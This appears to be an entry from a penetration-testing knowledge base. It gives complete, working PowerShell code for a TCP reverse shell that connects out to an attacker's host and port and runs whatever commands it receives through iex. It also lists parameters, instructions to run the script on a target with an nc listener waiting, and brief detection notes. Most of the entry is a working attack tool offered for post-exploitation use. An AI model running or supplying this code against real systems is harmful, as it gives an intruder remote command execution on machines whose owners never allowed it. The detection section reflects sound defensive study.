---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - reverse-shell
  - payload
validated: true
---

# PowerShell-TCP-Reverse-Shell

## Code

```powershell
$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (iex $data 2>&1 | Out-String )
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
$client.Close()
```

## Description

This PowerShell script creates a TCP reverse shell by connecting to an attacker's listener, reading commands, executing them via iex, and relaying output with a PowerShell prompt. It uses pure .NET classes, requiring no external tools on the target.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | Attacker's IP address for the connection | 192.168.1.100 |
| $ATTACKER_PORT | Listening port on attacker's machine | 4444 |

## Usage

Save as .ps1 and execute on target (e.g., powershell -f script.ps1), or embed in one-liners as in [[commands/PowerShell-One-Liner-Reverse-Shell]]. Requires a listener like nc -lvnp $ATTACKER_PORT on attacker side. Used in post-exploitation for interactive access after initial foothold.

## Detection

- PowerShell ScriptBlock logging capturing iex or TCPClient usage.
- Network flows: Outbound TCP from PowerShell process to unusual IPs/ports.
- Process monitoring: PowerShell spawning without typical interactive traits.

## Related

- [[procedures/Establish-PowerShell-Reverse-Shell]]
- [[commands/PowerShell-One-Liner-Reverse-Shell]]
